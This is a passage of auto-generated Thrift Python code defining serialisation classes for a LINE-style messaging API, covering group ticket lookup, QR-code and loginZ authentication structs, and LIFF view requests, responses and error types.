        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = Group()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('findGroupByTicket_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getAuthQrcode_args(object):
    
    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.BOOL, 'keepLoggedIn', None, None, ),  # 2
        (3, TType.STRING, 'systemName', 'UTF8', None, ),  # 3
    )

    def __init__(self, keepLoggedIn=None, systemName=None,):
        self.keepLoggedIn = keepLoggedIn
        self.systemName = systemName

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.BOOL:
                    self.keepLoggedIn = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.STRING:
                    self.systemName = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getAuthQrcode_args')
        if self.keepLoggedIn is not None:
            oprot.writeFieldBegin('keepLoggedIn', TType.BOOL, 2)
            oprot.writeBool(self.keepLoggedIn)
            oprot.writeFieldEnd()
        if self.systemName is not None:
            oprot.writeFieldBegin('systemName', TType.STRING, 3)
            oprot.writeString(self.systemName.encode('utf-8') if sys.version_info[0] == 2 else self.systemName)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class getAuthQrcode_result(object):
    
    thrift_spec = (
        (0, TType.STRUCT, 'success', [AuthQrcode, None], None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )
    
    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = AuthQrcode()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('getAuthQrcode_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class loginZ_args(object):
    
    thrift_spec = (
        None,  # 0
        None,  # 1
        (2, TType.STRUCT, 'loginRequest', [LoginRequest, None], None, ),  # 2
    )
    
    def __init__(self, req=None,):
        self.req = req

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 2:
                if ftype == TType.STRUCT:
                    self.req = LoginRequest()
                    self.req.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('loginZ_args')
        if self.req is not None:
            oprot.writeFieldBegin('req', TType.STRUCT, 2)
            self.req.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class loginZ_result(object):

    thrift_spec = (
        (0, TType.STRUCT, 'success', [LoginResult, None], None, ),  # 0
        (1, TType.STRUCT, 'e', [TalkException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, (self.__class__, self.thrift_spec))
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = LoginResult()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = TalkException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, (self.__class__, self.thrift_spec)))
            return
        oprot.writeStructBegin('loginZ_result')
        if self.success is not None:
            oprot.writeFieldBegin('success', TType.STRUCT, 0)
            self.success.write(oprot)
            oprot.writeFieldEnd()
        if self.e is not None:
            oprot.writeFieldBegin('e', TType.STRUCT, 1)
            self.e.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class LiffErrorCode(object):
    INVALID_REQUEST = 1
    UNAUTHORIZED = 2
    CONSENT_REQUIRED = 3
    VERSION_UPDATE_REQUIRED = 4
    SERVER_ERROR = 100

    _VALUES_TO_NAMES = {
        1: "INVALID_REQUEST",
        2: "UNAUTHORIZED",
        3: "CONSENT_REQUIRED",
        4: "VERSION_UPDATE_REQUIRED",
        100: "SERVER_ERROR",
    }

    _NAMES_TO_VALUES = {
        "INVALID_REQUEST": 1,
        "UNAUTHORIZED": 2,
        "CONSENT_REQUIRED": 3,
        "VERSION_UPDATE_REQUIRED": 4,
        "SERVER_ERROR": 100,
    }


class LiffFeatureType(object):
    GEOLOCATION = 1
    ADVERTISING_ID = 2
    BLUETOOTH_LE = 3

    _VALUES_TO_NAMES = {
        1: "GEOLOCATION",
        2: "ADVERTISING_ID",
        3: "BLUETOOTH_LE",
    }

    _NAMES_TO_VALUES = {
        "GEOLOCATION": 1,
        "ADVERTISING_ID": 2,
        "BLUETOOTH_LE": 3,
    }

class LiffErrorConsentRequired(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'channelId', 'UTF8', None, ),  # 1
        (2, TType.STRING, 'consentUrl', 'UTF8', None, ),  # 2
    )
    
    def __init__(self, channelId=None, consentUrl=None,):
        self.channelId = channelId
        self.consentUrl = consentUrl

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.channelId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.consentUrl = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LiffErrorConsentRequired')
        if self.channelId is not None:
            oprot.writeFieldBegin('channelId', TType.STRING, 1)
            oprot.writeString(self.channelId.encode('utf-8') if sys.version_info[0] == 2 else self.channelId)
            oprot.writeFieldEnd()
        if self.consentUrl is not None:
            oprot.writeFieldBegin('consentUrl', TType.STRING, 2)
            oprot.writeString(self.consentUrl.encode('utf-8') if sys.version_info[0] == 2 else self.consentUrl)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class LiffErrorPayload(object):
    
    thrift_spec = (
        None,  # 0
        None,  # 1
        None,  # 2
        (3, TType.STRUCT, 'consentRequired', [LiffErrorConsentRequired, None], None, ),  # 3
    )
    
    def __init__(self, consentRequired=None,):
        self.consentRequired = consentRequired

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 3:
                if ftype == TType.STRUCT:
                    self.consentRequired = LiffErrorConsentRequired()
                    self.consentRequired.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LiffErrorPayload')
        if self.consentRequired is not None:
            oprot.writeFieldBegin('consentRequired', TType.STRUCT, 3)
            self.consentRequired.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class LiffException(TException):
    
    thrift_spec = (
        None,  # 0
        (1, TType.I32, 'code', None, None, ),  # 1
        (2, TType.STRING, 'message', 'UTF8', None, ),  # 2
        (3, TType.STRUCT, 'payload', [LiffErrorPayload, None], None, ),  # 3
    )

    def __init__(self, code=None, message=None, payload=None,):
        self.code = code
        self.message = message
        self.payload = payload

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.I32:
                    self.code = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.message = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.STRUCT:
                    self.payload = LiffErrorPayload()
                    self.payload.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LiffException')
        if self.code is not None:
            oprot.writeFieldBegin('code', TType.I32, 1)
            oprot.writeI32(self.code)
            oprot.writeFieldEnd()
        if self.message is not None:
            oprot.writeFieldBegin('message', TType.STRING, 2)
            oprot.writeString(self.message.encode('utf-8') if sys.version_info[0] == 2 else self.message)
            oprot.writeFieldEnd()
        if self.payload is not None:
            oprot.writeFieldBegin('payload', TType.STRUCT, 3)
            self.payload.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class LiffChatContext(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'chatMid', 'UTF8', None, ),  # 1
    )

    def __init__(self, chatMid=None,):
        self.chatMid = chatMid

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.chatMid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LiffChatContext')
        if self.chatMid is not None:
            oprot.writeFieldBegin('chatMid', TType.STRING, 1)
            oprot.writeString(self.chatMid.encode('utf-8') if sys.version_info[0] == 2 else self.chatMid)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()
        
class LiffNoneContext(object):

    thrift_spec = ()
    
    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LiffNoneContext')
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class LiffSquareChatContext(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'squareChatMid', 'UTF8', None, ),  # 1
    )
    
    def __init__(self, squareChatMid=None,):
        self.squareChatMid = squareChatMid

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.squareChatMid = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LiffSquareChatContext')
        if self.squareChatMid is not None:
            oprot.writeFieldBegin('squareChatMid', TType.STRING, 1)
            oprot.writeString(self.squareChatMid.encode('utf-8') if sys.version_info[0] == 2 else self.squareChatMid)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class LiffContext(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'none', [LiffNoneContext, None], None, ),  # 1
        (2, TType.STRUCT, 'chat', [LiffChatContext, None], None, ),  # 2
        (3, TType.STRUCT, 'squareChat', [LiffSquareChatContext, None], None, ),  # 3
    )

    def __init__(self, none=None, chat=None, squareChat=None,):
        self.none = none
        self.chat = chat
        self.squareChat = squareChat

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.none = LiffNoneContext()
                    self.none.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRUCT:
                    self.chat = LiffChatContext()
                    self.chat.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.STRUCT:
                    self.squareChat = LiffSquareChatContext()
                    self.squareChat.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LiffContext')
        if self.none is not None:
            oprot.writeFieldBegin('none', TType.STRUCT, 1)
            self.none.write(oprot)
            oprot.writeFieldEnd()
        if self.chat is not None:
            oprot.writeFieldBegin('chat', TType.STRUCT, 2)
            self.chat.write(oprot)
            oprot.writeFieldEnd()
        if self.squareChat is not None:
            oprot.writeFieldBegin('squareChat', TType.STRUCT, 3)
            self.squareChat.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class LiffView(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'type', 'UTF8', None, ),  # 1
        (2, TType.STRING, 'url', 'UTF8', None, ),  # 2
        None,  # 3
        (4, TType.I32, 'titleTextColor', None, None, ),  # 4
        (5, TType.I32, 'titleBackgroundColor', None, None, ),  # 5
        (6, TType.STRING, 'titleIconUrl', 'UTF8', None, ),  # 6
        (7, TType.I32, 'titleSubtextColor', None, None, ),  # 7
        (8, TType.I32, 'titleButtonColor', None, None, ),  # 8
        (9, TType.I32, 'progressBarColor', None, None, ),  # 9
        (10, TType.I32, 'progressBackgroundColor', None, None, ),  # 10
        (11, TType.BOOL, 'trustedDomain', None, None, ),  # 11
    )
    
    def __init__(self, type=None, url=None, trustedDomain=None, titleIconUrl=None, titleTextColor=None, titleSubtextColor=None, titleButtonColor=None, titleBackgroundColor=None, progressBarColor=None, progressBackgroundColor=None,):
        self.type = type
        self.url = url
        self.trustedDomain = trustedDomain
        self.titleIconUrl = titleIconUrl
        self.titleTextColor = titleTextColor
        self.titleSubtextColor = titleSubtextColor
        self.titleButtonColor = titleButtonColor
        self.titleBackgroundColor = titleBackgroundColor
        self.progressBarColor = progressBarColor
        self.progressBackgroundColor = progressBackgroundColor

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.type = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.url = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 11:
                if ftype == TType.BOOL:
                    self.trustedDomain = iprot.readBool()
                else:
                    iprot.skip(ftype)
            elif fid == 6:
                if ftype == TType.STRING:
                    self.titleIconUrl = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.I32:
                    self.titleTextColor = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 7:
                if ftype == TType.I32:
                    self.titleSubtextColor = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 8:
                if ftype == TType.I32:
                    self.titleButtonColor = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 5:
                if ftype == TType.I32:
                    self.titleBackgroundColor = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 9:
                if ftype == TType.I32:
                    self.progressBarColor = iprot.readI32()
                else:
                    iprot.skip(ftype)
            elif fid == 10:
                if ftype == TType.I32:
                    self.progressBackgroundColor = iprot.readI32()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LiffView')
        if self.type is not None:
            oprot.writeFieldBegin('type', TType.STRING, 1)
            oprot.writeString(self.type.encode('utf-8') if sys.version_info[0] == 2 else self.type)
            oprot.writeFieldEnd()
        if self.url is not None:
            oprot.writeFieldBegin('url', TType.STRING, 2)
            oprot.writeString(self.url.encode('utf-8') if sys.version_info[0] == 2 else self.url)
            oprot.writeFieldEnd()
        if self.titleTextColor is not None:
            oprot.writeFieldBegin('titleTextColor', TType.I32, 4)
            oprot.writeI32(self.titleTextColor)
            oprot.writeFieldEnd()
        if self.titleBackgroundColor is not None:
            oprot.writeFieldBegin('titleBackgroundColor', TType.I32, 5)
            oprot.writeI32(self.titleBackgroundColor)
            oprot.writeFieldEnd()
        if self.titleIconUrl is not None:
            oprot.writeFieldBegin('titleIconUrl', TType.STRING, 6)
            oprot.writeString(self.titleIconUrl.encode('utf-8') if sys.version_info[0] == 2 else self.titleIconUrl)
            oprot.writeFieldEnd()
        if self.titleSubtextColor is not None:
            oprot.writeFieldBegin('titleSubtextColor', TType.I32, 7)
            oprot.writeI32(self.titleSubtextColor)
            oprot.writeFieldEnd()
        if self.titleButtonColor is not None:
            oprot.writeFieldBegin('titleButtonColor', TType.I32, 8)
            oprot.writeI32(self.titleButtonColor)
            oprot.writeFieldEnd()
        if self.progressBarColor is not None:
            oprot.writeFieldBegin('progressBarColor', TType.I32, 9)
            oprot.writeI32(self.progressBarColor)
            oprot.writeFieldEnd()
        if self.progressBackgroundColor is not None:
            oprot.writeFieldBegin('progressBackgroundColor', TType.I32, 10)
            oprot.writeI32(self.progressBackgroundColor)
            oprot.writeFieldEnd()
        if self.trustedDomain is not None:
            oprot.writeFieldBegin('trustedDomain', TType.BOOL, 11)
            oprot.writeBool(self.trustedDomain)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class LiffViewRequest(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRING, 'liffId', 'UTF8', None, ),  # 1
        (2, TType.STRUCT, 'context', [LiffContext, None], None, ),  # 2
    )
    
    def __init__(self, liffId=None, context=None,):
        self.liffId = liffId
        self.context = context

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRING:
                    self.liffId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRUCT:
                    self.context = LiffContext()
                    self.context.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LiffViewRequest')
        if self.liffId is not None:
            oprot.writeFieldBegin('liffId', TType.STRING, 1)
            oprot.writeString(self.liffId.encode('utf-8') if sys.version_info[0] == 2 else self.liffId)
            oprot.writeFieldEnd()
        if self.context is not None:
            oprot.writeFieldBegin('context', TType.STRUCT, 2)
            self.context.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()


class LiffViewResponse(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'view', [LiffView, None], None, ),  # 1
        (2, TType.STRING, 'contextToken', 'UTF8', None, ),  # 2
        (3, TType.STRING, 'accessToken', 'UTF8', None, ),  # 3
        (4, TType.STRING, 'featureToken', 'UTF8', None, ),  # 4
        (5, TType.LIST, 'features', (TType.I32, None, False), None, ),  # 5
        (6, TType.STRING, 'channelId', 'UTF8', None, ),  # 6
    )
    
    def __init__(self, view=None, contextToken=None, accessToken=None, featureToken=None, features=None, channelId=None,):
        self.view = view
        self.contextToken = contextToken
        self.accessToken = accessToken
        self.featureToken = featureToken
        self.features = features
        self.channelId = channelId

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 1:
                if ftype == TType.STRUCT:
                    self.view = LiffView()
                    self.view.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 2:
                if ftype == TType.STRING:
                    self.contextToken = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 3:
                if ftype == TType.STRING:
                    self.accessToken = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 4:
                if ftype == TType.STRING:
                    self.featureToken = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            elif fid == 5:
                if ftype == TType.LIST:
                    self.features = []
                    (_etype3, _size0) = iprot.readListBegin()
                    for _i4 in range(_size0):
                        _elem5 = iprot.readI32()
                        self.features.append(_elem5)
                    iprot.readListEnd()
                else:
                    iprot.skip(ftype)
            elif fid == 6:
                if ftype == TType.STRING:
                    self.channelId = iprot.readString().decode('utf-8') if sys.version_info[0] == 2 else iprot.readString()
                else:
                    iprot.skip(ftype)
            else:
                iprot.skip(ftype)
            iprot.readFieldEnd()
        iprot.readStructEnd()

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('LiffViewResponse')
        if self.view is not None:
            oprot.writeFieldBegin('view', TType.STRUCT, 1)
            self.view.write(oprot)
            oprot.writeFieldEnd()
        if self.contextToken is not None:
            oprot.writeFieldBegin('contextToken', TType.STRING, 2)
            oprot.writeString(self.contextToken.encode('utf-8') if sys.version_info[0] == 2 else self.contextToken)
            oprot.writeFieldEnd()
        if self.accessToken is not None:
            oprot.writeFieldBegin('accessToken', TType.STRING, 3)
            oprot.writeString(self.accessToken.encode('utf-8') if sys.version_info[0] == 2 else self.accessToken)
            oprot.writeFieldEnd()
        if self.featureToken is not None:
            oprot.writeFieldBegin('featureToken', TType.STRING, 4)
            oprot.writeString(self.featureToken.encode('utf-8') if sys.version_info[0] == 2 else self.featureToken)
            oprot.writeFieldEnd()
        if self.features is not None:
            oprot.writeFieldBegin('features', TType.LIST, 5)
            oprot.writeListBegin(TType.I32, len(self.features))
            for iter6 in self.features:
                oprot.writeI32(iter6)
            oprot.writeListEnd()
            oprot.writeFieldEnd()
        if self.channelId is not None:
            oprot.writeFieldBegin('channelId', TType.STRING, 6)
            oprot.writeString(self.channelId.encode('utf-8') if sys.version_info[0] == 2 else self.channelId)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class issueLiffView_args(object):
    
    thrift_spec = (
        None,  # 0
        (1, TType.STRUCT, 'request', [LiffViewRequest, None], None, ),  # 1
    )

    def __init__(self, request=None,):
        self.request = request

    def write(self, oprot):
        if oprot._fast_encode is not None and self.thrift_spec is not None:
            oprot.trans.write(oprot._fast_encode(self, [self.__class__, self.thrift_spec]))
            return
        oprot.writeStructBegin('issueLiffView_args')
        if self.request is not None:
            oprot.writeFieldBegin('request', TType.STRUCT, 1)
            self.request.write(oprot)
            oprot.writeFieldEnd()
        oprot.writeFieldStop()
        oprot.writeStructEnd()

class issueLiffView_result(object):
    
    thrift_spec = (
        (0, TType.STRUCT, 'success', [LiffViewResponse, None], None, ),  # 0
        (1, TType.STRUCT, 'e', [LiffException, None], None, ),  # 1
    )

    def __init__(self, success=None, e=None,):
        self.success = success
        self.e = e

    def read(self, iprot):
        if iprot._fast_decode is not None and isinstance(iprot.trans, TTransport.CReadableTransport) and self.thrift_spec is not None:
            iprot._fast_decode(self, iprot, [self.__class__, self.thrift_spec])
            return
        iprot.readStructBegin()
        while True:
            (fname, ftype, fid) = iprot.readFieldBegin()
            if ftype == TType.STOP:
                break
            if fid == 0:
                if ftype == TType.STRUCT:
                    self.success = LiffViewResponse()
                    self.success.read(iprot)
                else:
                    iprot.skip(ftype)
            elif fid == 1:
                if ftype == TType.STRUCT:
                    self.e = LiffException()
                    self.e.read(iprot)
                else:
                    iprot.skip(ftype)
            else:
